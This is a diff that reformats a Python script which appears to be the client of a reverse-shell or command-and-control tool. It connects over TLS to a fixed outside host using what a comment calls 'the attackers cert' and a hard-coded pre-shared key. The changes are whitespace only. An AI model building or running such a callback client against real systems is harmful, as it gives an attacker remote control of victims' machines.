@@ -14,12 +14,16 @@ import argparse
 
 # Change here the default values
 parser = argparse.ArgumentParser()
-parser.add_argument('--port', type=int, help='Port to connect to', default=9999)
-parser.add_argument('--host', type=str, help='Host to connect to', default="asi.ericroy.net")
-parser.add_argument('--password', type=str, help='Pre-shared key', default="123456789")
-parser.add_argument('--public-key-path', type=str, help='Server\'s certificate path', default="cert.pem")
-
+parser.add_argument('--port', type=int,
+                    help='Port to connect to', default=9999)
+parser.add_argument('--host', type=str,
+                    help='Host to connect to', default="asi.ericroy.net")
+parser.add_argument('--password', type=str,
+                    help='Pre-shared key', default="123456789")
+parser.add_argument('--public-key-path', type=str,
+                    help='Server\'s certificate path', default="cert.pem")
 args = parser.parse_args()
+
 
 def tls_socket():
     """
@@ -34,6 +38,7 @@ def tls_socket():
     context.load_verify_locations(args.public_key_path)  # the attackers cert
 
     return context.wrap_socket(s, server_hostname=args.host)
+
 
 def main():
     try:
@@ -80,6 +85,7 @@ def main():
             break
 
     s.close()
+
 
 if __name__ == '__main__':
     main()
